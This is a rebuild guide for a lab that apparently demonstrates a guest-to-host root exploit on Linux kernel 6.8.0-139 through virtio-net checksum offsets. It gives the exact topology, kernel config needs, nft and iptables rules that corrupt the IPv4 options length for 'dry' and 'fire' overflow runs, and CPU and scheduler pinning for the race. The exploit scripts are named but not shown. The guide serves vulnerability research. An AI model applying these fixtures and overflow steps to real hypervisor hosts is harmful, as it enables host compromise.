# LAB-ENV — PwnEscape Lab environment

This document describes the exact lab used for the two included root routes. It is
written for a rebuild on a fresh `pwnescape-lab` VM.

---

## 1. Topology

| Role | Host | Address | OS / kernel | Notes |
|---|---|---|---|---|
| L0 | libvirt host | — | libvirt host | VM control, snapshots, reset |
| L1 | `pwnescape-lab` | `192.168.122.204` | Ubuntu, `6.8.0-139-generic` | victim host; root lab |
| L2 | `l2-attacker` | `192.168.250.114` | Ubuntu 24.04, `6.8.0-142-generic` | attacker guest; virtio-net |

- L2 is attached to the isolated libvirt network `pwnescape-isolated`.
- Bridge on L1: `virbr-pwn`, address `192.168.250.1/24`.
- L1 has an additional IPv6 address `fd00:1::1/64` on `virbr-pwn`.
- L2 interface: `enp1s0`.
- L1 veth fixture: `r6a` (injector side) ↔ `r6b` (`10.99.0.1/24`), plus a
  `dum0` dummy device and a `/32` route for `172.31.99.2` to prevent a
  forwarding loop.

```
L0 libvirt host
└── L1 pwnescape-lab 192.168.122.204  6.8.0-139
    ├── virbr-pwn 192.168.250.1/24, fd00:1::1/64
    │   └── L2 l2-attacker 192.168.250.114  enp1s0
    └── r6a ↔ r6b 10.99.0.1/24  (host-side injection fixture)
```

Access:

```bash
# L1 from the lab network
ssh ubuntu@192.168.122.204

# L2 from L1
ssh -i ~/.ssh/l2_key ubuntu@192.168.250.114
```

Snapshots on L0:

```bash
sudo virsh snapshot-list pwnescape-lab
# pwnescape-lab-clean
# pwnescape-pre-rce
```

Do not reset a lab while a dry/fire run is in progress. Use a clone if you
need a fresh run.

---

## 2. Target kernel and config

- `6.8.0-139-generic` on L1.
- Source tree used for the line numbers in the reports: the local `linux-6.8`
  tree (vanilla 6.8). It is not bundled in this package.
  Ubuntu's `6.8.0-139` carries patches; the function bodies are the same, but
  line numbers can shift by a few lines. Use the function names as the stable
  reference.
- Pre-fix: no `ip_check_csum_start()` checks in the checksum consumers.
- `CONFIG_RANDSTRUCT_NONE=y` on the audited target. This is required for the
  `work_struct` and `subprocess_info` field offsets used by the payload.
- `CONFIG_DEBUG_OBJECTS` is not set; `WORK_STRUCT_WQ_DATA_MASK = ~0xff`.
- `CONFIG_RANDOM_KMALLOC_CACHES` is enabled; the `kmalloc-rnd-XX-64` cache
  index changes per boot.
- `CONFIG_INIT_ON_ALLOC_DEFAULT_ON` is enabled. It does not stop the forward
  overflow; it only zeroes a fresh allocation.

Verify:

```bash
uname -r
grep -E 'CONFIG_RANDSTRUCT|CONFIG_DEBUG_OBJECTS|CONFIG_RANDOM_KMALLOC|CONFIG_INIT_ON_ALLOC|CONFIG_FREELIST' \
  /boot/config-$(uname -r)
```

---

## 3. Build dependencies on L1

```bash
sudo apt-get update
sudo apt-get install -y \
  build-essential clang llvm bpftool libbpf-dev libelf-dev zlib1g-dev \
  bpftrace python3 iproute2 nftables iptables pkg-config
```

The observer build uses:

```bash
bpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h
clang -O2 -g -target bpf -D__TARGET_ARCH_x86 -I. -c r6obs.bpf.c -o r6obs.bpf.o
gcc -O2 -o r6obs r6obs.c -lbpf -lelf -lz
```

`scripts/common/r6obs_build.sh` performs these steps inside
`/opt/pwnescape/tools`.

---

## 4. Deploy the package

```bash
# On L1, from the PwnEscape-lab directory
sudo bash scripts/common/install.sh
sudo bash scripts/common/check_env.sh
```

The installer copies the scripts to `/opt/pwnescape/tools/`, creates
`/tmp/r6new`, and builds `r6obs`. It does not start any fixture. The read-only
`check_env.sh` prints the kernel, config, writer, listener, veth, tool, and
CPU7 status. The tool inventory after install:

```
/opt/pwnescape/tools/
  listen_on.py          r6obs                r6obs.bpf.o
  r6_host_gate2.py      r6e.py               cacheid.py
  r6read.py             r6fire.py            r6guestsniff.py
  r6selfcheck.py        r6selfcheck_guest.py
  r7_final4.py          r8waiter.py          r7_guest.py
  r7_obs4.bt            v12chain.sh          r7_gate2.sh
  r7_gateobs.bt         r7_ftrace.sh         r7_ftparse.py
  ...
```

If you prefer to run from the package directory, use the `scripts/` paths
directly; the only hard requirement is that `r6obs` is on the expected path or
`R6OBS_OBJ` points to its BPF object.

`setup_guest_full.sh` is the legacy r1 guest deployment. It expects the
original `/opt/pwnescape/tools` inventory (`synopt`, `tcpack`, `genv5.py`,
etc.) and is not required for the r6 route. The r6 guest only needs the DROP
rule and `r6guestsniff.py` from §6.

---

## 5. Host fixture for r6 (the primary route)

### 5.1 veth pair and route guard

```bash
sudo bash /opt/pwnescape/tools/r6veth_up.sh
```

This creates:

- `r6a` ↔ `r6b` veth pair;
- `10.99.0.1/24` on `r6b`;
- `dum0` dummy device;
- `172.31.99.2/32 dev dum0` route;
- `rp_filter=0` and `forwarding=0` on both veth ends;
- `FORWARD` drops between `r6a`/`r6b` to prevent a loop.

### 5.2 Listener

```bash
sudo python3 /opt/pwnescape/tools/listen_on.py 7778 &
```

`listen_on.py` binds `0.0.0.0:7778` with a large backlog and parks accepted
sockets. The workqueue target is `rt6_probe_deferred`; the listener only needs
to keep the TCP request path alive.

### 5.3 The in-window writer

```bash
sudo iptables -t mangle -A INPUT -p tcp --dport 7778 \
  -j CHECKSUM --checksum-fill
```

This is the r6 writer. It calls `skb_checksum_help()` on
`CHECKSUM_PARTIAL` packets. The guest controls the virtio-net `csum_start`, so
the 2-byte checksum write lands on IPv4 byte 21 (the RR length byte).

Verify:

```bash
sudo iptables -t mangle -S INPUT
sudo modprobe xt_CHECKSUM
```

### 5.4 IPv6 probe fixture

```bash
sudo ip -6 addr add fd00:1::1/64 dev virbr-pwn nodad
sudo sysctl -qw net.ipv6.conf.all.forwarding=0
sudo sysctl -qw net.ipv6.conf.virbr-pwn.router_probe_interval=10
sudo sysctl -qw net.ipv4.tcp_synack_retries=12
sudo sysctl -qw net.ipv4.neigh.default.gc_thresh1=1024
sudo sysctl -qw net.ipv4.neigh.default.gc_thresh2=4096
sudo sysctl -qw net.ipv4.neigh.default.gc_thresh3=8192
```

The probe route is created by the driver (`r6read.py` / `r6fire.py`):

```bash
ip nexthop add id <id> via fe80::<gw> dev virbr-pwn
ip -6 route replace fd01:0:<gw>::/64 nhid <id>
ip -6 neigh replace fe80::<gw> lladdr 02:00:00:00:00:01 dev virbr-pwn nud failed
```

The route must age for ~11.6 seconds before the first probe, otherwise the
neighbour state is not yet `FAILED`.

### 5.5 CPU and scheduler fixture

```bash
# vhost worker and sshd on CPU7
for p in $(pgrep -x sshd); do sudo taskset -pc 7 "$p"; done
for t in $(ps -eLo tid,comm | awk '/vhost-/ {print $1}'); do
  sudo taskset -pc 7 "$t"
done

# listener on CPU7
sudo taskset -pc 7 "$(pgrep -f listen_on.py)"

# CPU7 kworkers: SCHED_IDLE during the critical section
for t in $(ps -eLo tid,psr,comm | awk '$2==7 && /kworker/ {print $1}'); do
  sudo chrt -i -p 0 "$t"
done
```

The drivers set themselves to `SCHED_FIFO 50` and pin to CPU7 for the
`RST → probe → RST → overflower` sequence. Restore kworkers with
`chrt -o -p 0 <tid>` after the run.

### 5.6 Eligibility gate

```bash
sudo python3 /opt/pwnescape/tools/r6_host_gate2.py 10 0x7b00
```

Expected:

```
HOSTGATE2 dopt=11(...) siteE=01(...) siteN=11(...) hit=N verdict=ELIGIBLE
```

Accept only `ELIGIBLE` with `hit=E` or `hit=N`. The gate is read-only: it starts
`r6obs`, sends victim SYNs, triggers both IPv6 callsites, and compares cache
indices with `cacheid.py`. If `INELIGIBLE`, cold-boot and retry.

> The gate uses the `r6e.py` frame set (`172.31.99.2 → 10.99.0.1`) and the same
> `r6a/r6b` veth. The final `r6read.py` / `r6fire.py` use
> `192.168.250.114 → 192.168.250.1` over the same veth fixture. Both are
> host-side injection drivers; the cache-index comparison is what matters.

---

## 6. Guest setup for r6

```bash
# On L2
sudo iptables -C INPUT -p tcp --sport 7778 -j DROP 2>/dev/null || \
  sudo iptables -I INPUT 1 -p tcp --sport 7778 -j DROP
```

The DROP rule prevents the guest stack from consuming the malformed SYN-ACK
before the guest sniffer sees it. `AF_PACKET` capture sees the frame before
netfilter.

Guest-side capture:

```bash
sudo python3 /tmp/r6guestsniff.py /tmp/guestwin.txt 30
```

Copy the sniffer to L2:

```bash
scp -i ~/.ssh/l2_key /opt/pwnescape/tools/r6guestsniff.py \
  ubuntu@192.168.250.114:/tmp/
```

The sniffer expects `enp1s0` and the `192.168.250.1 → 192.168.250.114`
direction. It prints `GUESTWIN` and `WINHEX` lines for the 255-byte window.

---

## 7. r1 fixtures

### 7.1 nft writer (r1)

```bash
sudo nft add table ip m2
sudo nft 'add chain ip m2 c { type filter hook input priority mangle; }'
# Per attempt, added by r7_final4.py:
sudo nft add rule ip m2 c tcp dport 7778 tcp sport <ovsp> \
  @nh,168,8 set 0x40     # dry: 64-byte echo
sudo nft add rule ip m2 c tcp dport 7778 tcp sport <ovsp> \
  @nh,168,8 set 0xe0     # fire: 224-byte echo
sudo nft flush chain ip m2 c
```

`@nh,168,8` is bit 168 of the network header = **IPv4 byte 21** = RR length.
The rule must be sport-conditioned; an unconditional SET would also mangle
every victim's RR length.

### 7.2 Observers

- `r6obs` — CO-RE `workqueue_queue_work` / `workqueue_execute_start` /
  `__ip_options_echo` observer. Emits `QUEUE`, `EXEC`, `ECHO`.
- `r7_obs4.bt` — evidence-strengthened observer for r1: ECHO/ECHORET, WCHK,
  QUEUE/ACT, EXEC/EXECEND, callback entry.
- `r7_gateobs.bt` / `r7_ftrace.sh` — gate observers used by `r7_gate2.sh`.

Build/run:

```bash
T=$(grep -w rt6_probe_deferred /proc/kallsyms | awk '{print $1}')
sudo /opt/pwnescape/tools/r6obs 0x$T 300 > /tmp/obs.log 2>&1
```

### 7.3 Guest waiter (r1)

```bash
# On L2
sudo python3 /tmp/r8waiter.py
```

It binds UDP `0.0.0.0:9999` and waits for `GON <ovsp> <ovseq> <hexpayload>`
from the host driver. Keep the ssh session open; the original lab used a
foreground-in-ssh waiter because transient systemd units died within ~2 s.

---

## 8. r6obs build and paths

From the package:

```bash
sudo bash scripts/common/r6obs_build.sh
```

The build script assumes `/opt/pwnescape/tools`. If you run it from another
directory, set:

```bash
export R6OBS_OBJ=/path/to/r6obs.bpf.o
```

`r6obs.c` opens `R6OBS_OBJ` if set, otherwise
`/opt/pwnescape/tools/r6obs.bpf.o`.

---

## 9. Reset and recovery

The 224-byte fire copy can wedge L1 if it lands on an unrelated
`kmalloc-64` object. Recovery:

```bash
# On L0
sudo virsh reset pwnescape-lab
# or, if the snapshot is intact:
sudo virsh snapshot-revert pwnescape-lab pwnescape-lab-clean
```

After reset:

```bash
sudo bash /opt/pwnescape/tools/r6veth_up.sh
sudo python3 /opt/pwnescape/tools/listen_on.py &
sudo iptables -t mangle -A INPUT -p tcp --dport 7778 -j CHECKSUM --checksum-fill
sudo ip -6 addr add fd00:1::1/64 dev virbr-pwn nodad
```

Do not run the fire step without a dry PASS. Do not send `0xFF00`.

---

## 10. Environment caveats

1. **Host-fixture, not guest-only.** The writer, listener, IPv6 probe, and
   CPU7 pinning are host-side. The guest issues the traffic; the host provides
   the fixture.
2. **Per-boot values.** `pwq`, `poolhead`, KASLR, `V`, `W`, and the randomized
   cache index change on every boot. Re-derive, do not reuse.
3. **`r6fire.py` literals.** The as-run script has the successful boot's
   `PWQ`, `PH`, and `KBASE` at the top. For a new boot, replace them with the
   `DERIVED` line from `r6read.py`.
4. **`r6read.py` is not a production exploit.** It uses `r6obs` for the ECHO
   map and ground truth, and it prints the window. The payload values are
   guest-visible; the geometry is observer-confirmed.
5. **Guest kernel is newer.** L2 runs `6.8.0-142`; the bug is on L1
   `6.8.0-139`. The guest's input-side checks do not block the virtio metadata
   used by the r6 driver.
6. **Default host has no writer.** The audited Ubuntu 26.04 / libvirt 12.0.0
   target has no `INPUT`/`FORWARD` IPv4-option writer. The strict guest-only
   root chain is not demonstrated.
